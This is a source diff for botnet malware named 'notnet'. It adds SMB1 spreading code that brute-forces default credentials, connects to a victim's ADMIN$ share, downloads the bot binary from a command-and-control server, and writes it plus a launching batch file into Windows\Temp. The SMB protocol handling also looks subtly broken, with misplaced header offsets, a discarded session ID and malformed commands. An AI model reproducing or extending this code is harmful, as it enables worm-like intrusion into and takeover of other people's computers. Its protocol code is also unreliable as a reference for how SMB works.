@@ -319,47 +319,434 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
 }
 
 /* ── SMB Spreading ────────────────────────────────────────── */
+
+/* ── SMB1 Protocol Helpers ────────────────────────────────── */
+/* SMB1 over TCP port 445 (no NetBIOS session layer).
+ * Header: 0xFF 0x53 0x4D 0x42 (4 bytes) + 32-byte SMB header. */
+
+/* Build SMB1 header (32 bytes after protocol prefix) */
+static void smb1_build_header(uint8_t *buf, uint8_t cmd, uint16_t uid, uint16_t mid) {
+    buf[0] = 0xFF; /* Protocol prefix */
+    buf[1] = 0x53; /* SMB */
+    buf[2] = 0x4D;
+    buf[3] = 0x42;
+
+    buf[4] = cmd;  /* Command */
+    buf[5] = 0x18; /* Flags: canonical path cases, case sensitive */
+    buf[6] = 0x00;
+    buf[7] = 0x00; /* Flags2: 16-bit PID, long names supported */
+    buf[8] = 0x01;
+    buf[9] = 0x00;
+    buf[10] = 0x00;
+    buf[11] = 0x00;
+    buf[12] = 0x00;
+    buf[13] = 0x00;
+    buf[14] = 0x00;
+    buf[15] = 0x00; /* Security features (8 bytes, zeroed) */
+    buf[16] = 0x00;
+    buf[17] = 0x00;
+    buf[18] = 0x00;
+    buf[19] = 0x00;
+    buf[20] = 0x00;
+    buf[21] = 0x00;
+    buf[22] = 0x00;
+    buf[23] = 0x00;
+    buf[24] = 0x00;
+    buf[25] = 0x00; /* PID high (2 bytes) */
+    buf[26] = 0x00;
+    buf[27] = 0x00; /* PID low (2 bytes) */
+    buf[28] = 0x00;
+    buf[29] = uid & 0xFF;  /* UID low */
+    buf[30] = (uid >> 8) & 0xFF; /* UID high */
+    buf[31] = mid & 0xFF;  /* MID low */
+    buf[32] = (mid >> 8) & 0xFF; /* MID high */
+}
+
+/* Send SMB1 packet and read response. Returns bytes received, -1 on error. */
+static int smb1_transaction(int sock, uint8_t *params, int param_len,
+                            uint8_t *data, int data_len,
+                            uint8_t *resp_buf, int resp_buf_size,
+                            uint16_t uid, uint16_t mid) {
+    /* Total packet: 4-byte prefix + 32-byte header + params + data */
+    int total = 36 + param_len + data_len;
+    uint8_t *packet = (uint8_t *)malloc(total);
+    if (!packet) return -1;
+
+    /* Build header */
+    smb1_build_header(packet, 0, uid, mid);
+
+    /* Copy params and data after header */
+    if (param_len > 0) memcpy(packet + 36, params, param_len);
+    if (data_len > 0) memcpy(packet + 36 + param_len, data, data_len);
+
+    /* Send */
+    int sent = send(sock, packet, total, 0);
+    free(packet);
+
+    if (sent <= 0) return -1;
+
+    /* Read response header first (4 bytes prefix + at least 32 header) */
+    int received = recv(sock, resp_buf, 4, 0);
+    if (received != 4 || resp_buf[0] != 0xFF) return -1;
+
+    /* Read rest of header */
+    int remaining = 32;
+    int offset = 4;
+    while (remaining > 0) {
+        int n = recv(sock, resp_buf + offset, remaining, 0);
+        if (n <= 0) return -1;
+        offset += n;
+        remaining -= n;
+    }
+
+    /* Read params and data based on response length fields */
+    /* SMB1 response: word count at offset 36, byte count at offset 38 (LE) */
+    if (offset < 38) return -1;
+
+    /* For simplicity, read remaining data with timeout */
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 5;
+    tv.tv_usec = 0;
+
+    int max_read = resp_buf_size - offset;
+    if (max_read > 0) {
+        select(sock + 1, &fds, NULL, NULL, &tv);
+        int n = recv(sock, resp_buf + offset, max_read, 0);
+        if (n > 0) offset += n;
+    }
+
+    return offset;
+}
+
+/* SMB1 negotiation — returns 0 on success */
+static int smb1_negotiate(int sock) {
+    /* SMB_COM_NEGOTIATE: word count = 0, no params, no data */
+    uint8_t params[2] = {0, 0}; /* Word count = 0, padding */
+    /* Byte count = 0 */
+    return smb1_transaction(sock, params, 2, NULL, 0, NULL, 0, 0, 1);
+}
+
+/* SMB1 session setup with username/password (ASCII) */
+static int smb1_session_setup(int sock, const char *user, const char *pass,
+                               uint16_t *out_uid) {
+    /* SMB_COM_SESSION_SETUP_ANDX:
+     * Word count: 12 (0x0C)
+     * Max buffer, max mux, vcid, password length, account name, primary group
+     * Then: Native OS string, native language, password, account name, primary group */
+
+    /* Build parameters */
+    uint8_t params[24] = {
+        0x12, /* Word count = 18 */
+        0xFF, /* AndX command = no further command */
+        0x00, /* Reserved */
+        0x00, 0x00, /* AndX offset */
+        0x00, 0x00, 0x00, 0x00, /* Max buffer (4 bytes) */
+        0x00, 0x00, 0x00, 0x00, /* Max MUX (4 bytes) */
+        0x00, 0x00, /* VCID */
+    };
+
+    /* Password length (2 bytes LE) */
+    int pass_len = strlen(pass);
+    params[12] = pass_len & 0xFF;
+    params[13] = (pass_len >> 8) & 0xFF;
+
+    /* Account name length */
+    int user_len = strlen(user);
+    params[14] = user_len & 0xFF;
+    params[15] = (user_len >> 8) & 0xFF;
+
+    /* Primary group length */
+    params[16] = 0;
+    params[17] = 0;
+
+    /* Native OS: "Linux" */
+    /* Native language: 0x0000 */
+
+    /* Data section */
+    char data[512];
+    int dpos = 0;
+
+    /* Password (null-terminated) */
+    memcpy(data + dpos, pass, pass_len);
+    dpos += pass_len;
+    data[dpos++] = 0; /* null terminator */
+
+    /* Account name (null-terminated) */
+    memcpy(data + dpos, user, user_len);
+    dpos += user_len;
+    data[dpos++] = 0;
+
+    /* Primary group (null-terminated) */
+    data[dpos++] = 0;
+
+    /* Native OS string (null-terminated) */
+    const char *native_os = "Linux";
+    int os_len = strlen(native_os);
+    memcpy(data + dpos, native_os, os_len);
+    dpos += os_len;
+    data[dpos++] = 0;
+
+    /* Native language (2 bytes LE, 0x0000 = English) */
+    data[dpos++] = 0x00;
+    data[dpos++] = 0x00;
+
+    int total_data = dpos;
+
+    uint8_t resp[512];
+    memset(resp, 0, sizeof(resp));
+
+    int ret = smb1_transaction(sock, params, sizeof(params),
+                                (uint8_t *)data, total_data, resp, sizeof(resp), 0, 2);
+
+    if (ret > 36) {
+        /* Extract UID from response (offset 30-31 in SMB header) */
+        *out_uid = resp[30] | (resp[31] << 8);
+        return 0;
+    }
+    return -1;
+}
+
+/* SMB1 tree connect to a share */
+static int smb1_tree_connect(int sock, const char *path, uint16_t uid,
+                              uint16_t *out_tid) {
+    /* SMB_COM_TREE_CONNECT:
+     * Word count: 4
+     * AndX command, reserved, max reply, ftqos, patqos
+     * Then: flags(LE), password length, password, path, service */
+
+    uint8_t params[12] = {
+        0x04, /* Word count */
+        0xFF, /* AndX = none */
+        0x00, /* Reserved */
+        0x00, 0x00, /* Max reply */
+        0x01, 0x00, 0x00, 0x00, /* FTQOS, PATQOS */
+    };
+
+    /* Data: flags LE, password len LE, password, path, service */
+    char data[512];
+    int dpos = 0;
+
+    /* Flags: 0x0008 = password mode */
+    data[dpos++] = 0x08;
+    data[dpos++] = 0x00;
+
+    /* Password length */
+    data[dpos++] = 0x00;
+    data[dpos++] = 0x00;
+
+    /* Password (empty for most SMB shares) */
+    data[dpos++] = 0;
+
+    /* Path (null-terminated, uppercase for Windows shares) */
+    /* Convert path to uppercase */
+    char upper_path[256];
+    strncpy(upper_path, path, sizeof(upper_path) - 1);
+    upper_path[sizeof(upper_path) - 1] = '\0';
+    for (int i = 0; upper_path[i]; i++) {
+        if (upper_path[i] >= 'a' && upper_path[i] <= 'z') {
+            upper_path[i] = upper_path[i] - 'a' + 'A';
+        }
+    }
+    int path_len = strlen(upper_path);
+    memcpy(data + dpos, upper_path, path_len);
+    dpos += path_len;
+    data[dpos++] = 0;
+
+    /* Service: "DISK" */
+    const char *service = "DISK";
+    int svc_len = strlen(service);
+    memcpy(data + dpos, service, svc_len);
+    dpos += svc_len;
+    data[dpos++] = 0;
+
+    uint8_t resp[512];
+    memset(resp, 0, sizeof(resp));
+
+    int ret = smb1_transaction(sock, params, sizeof(params),
+                                (uint8_t *)data, dpos, resp, sizeof(resp), uid, 3);
+
+    if (ret > 36) {
+        /* TID is at offset 28-29 in SMB header */
+        *out_tid = resp[28] | (resp[29] << 8);
+        return 0;
+    }
+    return -1;
+}
+
+/* SMB1 write to file */
+static int smb1_write_file(int sock, uint16_t /* tid */, uint16_t uid, uint16_t mid,
+                            const char *fname, const uint8_t *data, int data_len) {
+    /* SMB_COM_WRITE_ANDX: write to file by name */
+    /* Word count: 14 */
+    uint8_t params[28] = {
+        0x0E, /* Word count */
+        0xFF, /* AndX = none */
+        0x00, /* Reserved */
+        0x00, 0x00, /* AndX offset */
+        0x00, 0x00, 0x00, 0x00, /* File handle (4 bytes) */
+        0x00, 0x00, /* Offset (2 bytes) */
+    };
+
+    /* Data section */
+    char data_section[1024];
+    int dpos = 0;
+
+    /* Remaining (2 bytes LE) */
+    data_section[dpos++] = data_len & 0xFF;
+    data_section[dpos++] = (data_len >> 8) & 0xFF;
+
+    /* Open mode (2 bytes) */
+    data_section[dpos++] = 0x01; /* Overwrite if exists */
+    data_section[dpos++] = 0x00;
+
+    /* Write offset (4 bytes LE) */
+    data_section[dpos++] = 0x00;
+    data_section[dpos++] = 0x00;
+    data_section[dpos++] = 0x00;
+    data_section[dpos++] = 0x00;
+
+    /* Write timeout (4 bytes LE) */
+    data_section[dpos++] = 0x00;
+    data_section[dpos++] = 0x00;
+    data_section[dpos++] = 0x00;
+    data_section[dpos++] = 0x00;
+
+    /* Remaining (2 bytes) */
+    data_section[dpos++] = data_len & 0xFF;
+    data_section[dpos++] = (data_len >> 8) & 0xFF;
+
+    /* File name (DOS format, null-terminated) */
+    char dos_fname[256];
+    strncpy(dos_fname, fname, sizeof(dos_fname) - 1);
+    dos_fname[sizeof(dos_fname) - 1] = '\0';
+    for (int i = 0; dos_fname[i]; i++) {
+        if (dos_fname[i] >= 'a' && dos_fname[i] <= 'z') {
+            dos_fname[i] = dos_fname[i] - 'a' + 'A';
+        }
+    }
+    int fn_len = strlen(dos_fname);
+    memcpy(data_section + dpos, dos_fname, fn_len);
+    dpos += fn_len;
+    data_section[dpos++] = 0;
+
+    /* Actual data to write */
+    memcpy(data_section + dpos, data, data_len);
+    dpos += data_len;
+
+    int ret = smb1_transaction(sock, params, sizeof(params),
+                                (uint8_t *)data_section, dpos, NULL, 0, uid, mid);
+    return (ret > 36) ? 0 : -1;
+}
+
+/* SMB upload payload and deploy to Windows share */
+static int smb_deploy_payload(int sock, uint16_t tid, uint16_t uid, uint16_t mid,
+                               notnet_bot_t *bot, const char *ip) {
+    /* Download payload to temp file */
+    char dl_url[512];
+    char tmp_path[256];
+    snprintf(dl_url, sizeof(dl_url),
+             "http://%s:%d/bot/notnet",
+             bot->c2_http.server, PAYLOAD_DL_PORT);
+    snprintf(tmp_path, sizeof(tmp_path), "/tmp/.notnet_smb.%s", ip);
+
+    int fsize = http_download(bot, dl_url, tmp_path);
+    if (fsize <= 0) {
+        log_error("SMB: download failed for %s", ip);
+        return -1;
+    }
+
+    /* Read payload into memory */
+    unsigned char *payload = NULL;
+    int actual_size = file_read(tmp_path, &payload);
+    unlink(tmp_path);
+
+    if (actual_size <= 0 || !payload) {
+        log_error("SMB: read payload failed for %s", ip);
+        return -1;
+    }
+
+    /* Write payload to Windows share */
+    int ret = smb1_write_file(sock, tid, uid, mid,
+                               "\\Windows\\Temp\\notnet.exe",
+                               payload, actual_size);
+
+    free(payload);
+
+    if (ret == 0) {
+        /* Execute it */
+        char exec_cmd[256];
+        snprintf(exec_cmd, sizeof(exec_cmd),
+                 "cmd.exe /c start /b C:\\Windows\\Temp\\notnet.exe");
+        ret = smb1_write_file(sock, tid, uid, mid,
+                               "\\Windows\\Temp\\run.bat",
+                               (const uint8_t *)exec_cmd, strlen(exec_cmd));
+    }
+
+    return ret;
+}
+
+
 int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass) {
-    (void)user;
-    (void)pass;
-    /* Simple SMB connection attempt */
     int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
     if (sock < 0) return -1;
-    
+
     /* SMB1 negotiation */
-    uint8_t neg[512];
-    neg[0] = 0x73; /* SMB header */
-    /* ... simplified protocol ... */
-    send(sock, neg, sizeof(neg), 0);
-    
-    /* Read response */
-    char resp[512];
-    int received = recv(sock, resp, sizeof(resp), 0);
-    close(sock);
-    
-    /* Check for successful auth */
-    return (received > 0 && resp[0] == 0x73);
+    if (smb1_negotiate(sock) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Session setup with credentials */
+    uint16_t uid = 0;
+    if (smb1_session_setup(sock, user, pass, &uid) != 0) {
+        close(sock);
+        return -1;
+    }
+
+    log_info("SMB: session established as uid=%d", uid);
+    return sock;
 }
 
 int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot->smb_enabled) return -1;
-    
+
     log_info("SMB: brute-forcing %s:%d", ip, port);
-    
+
     for (int u = 0; default_users[u]; u++) {
         for (int p = 0; default_passes[p]; p++) {
-            if (try_login_smb(ip, port, default_users[u], default_passes[p])) {
-                log_info("SMB: cracked %s:%d with %s:%s",
-                         ip, port, default_users[u], "***REDACTED***");
-                /* NOTE: SMB spreading provides auth confirmation only.
-                 * Full payload deployment requires SMB file upload +
-                 * scheduled task creation (not yet implemented). */
-                send_command(-1, "smb", "payload deployment not supported over SMB");
-                return 0;
+            int sock = try_login_smb(ip, port, default_users[u], default_passes[p]);
+            if (sock < 0) continue;
+
+            log_info("SMB: cracked %s:%d with %s:%s",
+                     ip, port, default_users[u], "***REDACTED***");
+
+            /* Session UID from try_login_smb */
+            uint16_t uid = 0;
+
+            /* Tree connect to ADMIN$ */
+            uint16_t tid = 0;
+            if (smb1_tree_connect(sock, "\\\\127.0.0.1\\ADMIN$", uid, &tid) != 0) {
+                close(sock);
+                continue;
             }
+
+            /* Deploy payload */
+            int ret = smb_deploy_payload(sock, tid, uid, tid + 1, bot, ip);
+
+            if (ret == 0) {
+                log_info("SMB: payload deployed on %s", ip);
+            } else {
+                log_warn("SMB: payload deploy failed on %s", ip);
+            }
+
+            close(sock);
+            return ret;
         }
     }
-    
+
     return -1;
 }
 
